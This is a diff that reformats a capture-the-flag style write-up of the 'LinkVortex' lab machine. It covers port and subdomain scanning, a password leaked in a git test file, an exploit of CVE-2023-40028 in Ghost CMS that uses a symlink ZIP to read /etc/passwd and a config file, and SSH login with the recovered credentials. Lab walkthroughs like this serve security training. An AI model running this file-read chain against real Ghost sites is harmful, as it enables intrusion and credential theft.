@@ -17,14 +17,25 @@ nmap, ffuf, git‑dumper, curl, zip/unzip, Python 3 (requests, zipfile), sshpas
 ---
 
 ## Recon 🔍  
-```bash
-# Scan all ports & services
-nmap -p- --min-rate 10000 10.10.11.47
-nmap -p 22,80 -sCV       10.10.11.47
 
+##### Scan all ports & services
+
+```bash
+nmap -p- --min-rate 10000 10.10.11.47
+```
+
+```bash
+nmap -p 22,80 -sCV 10.10.11.47
+```
 # Host‑header fuzzing to find dev subdomain
+
+```bash
 ffuf -u http://10.10.11.47 -H "Host: FUZZ.linkvortex.htb" \
      -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac
+```
+
+```bash
+feroxbuster -u http://dev.linkvortex.htb
 ```
 
 ---
@@ -37,26 +48,31 @@ ffuf -u http://10.10.11.47 -H "Host: FUZZ.linkvortex.htb" \
 2. **Harvest creds**  
    - In `ghost/core/test/regression/api/admin/authentication.test.js`, password changed to `OctopiFociPilfer45`  
    - Login at `http://linkvortex.htb/ghost` with `admin@linkvortex.htb`  
+
 3. **Exploit CVE‑2023‑40028**  
-   ```bash
+
    # Craft ZIP with symlink:
-   ln -s /etc/passwd content/images/evil.png
-   zip -y -r poc.zip content/images/evil.png
+   ```bash
+ln -s /etc/passwd content/images/evil.png
+zip -y -r poc.zip content/images/evil.png
+```
 
-   # Import via Ghost Admin API (use your session cookie)
-   curl -F "importfile=@poc.zip" -b "ghost-admin-api-session=…" \
-        http://linkvortex.htb/ghost/api/admin/db
+#### Import via Ghost Admin API (use your session cookie)
+```bash
+curl -F "importfile=@poc.zip" -b "ghost-admin-api-session=…" http://linkvortex.htb/ghost/api/admin/db
+```
 
+```
    # Read file:
    curl http://linkvortex.htb/content/images/evil.png
    ```
+
 4. **Extract bob’s SSH credentials**  
    ```bash
-   curl -b "ghost-admin-api-session=…" \
-        http://linkvortex.htb/var/lib/ghost/config.production.json \
-     | jq '.mail.options.auth'
-   # → "bob@linkvortex.htb" / "fibber-talented-worth"
+   curl -b "ghost-admin-api-session=…" http://linkvortex.htb/var/lib/ghost/config.production.json | jq '.mail.options.auth'
    ```
+   #### → "bob@linkvortex.htb" / "fibber-talented-worth"
+
 5. **SSH as bob**  
    ```bash
    sshpass -p fibber-talented-worth ssh bob@linkvortex.htb
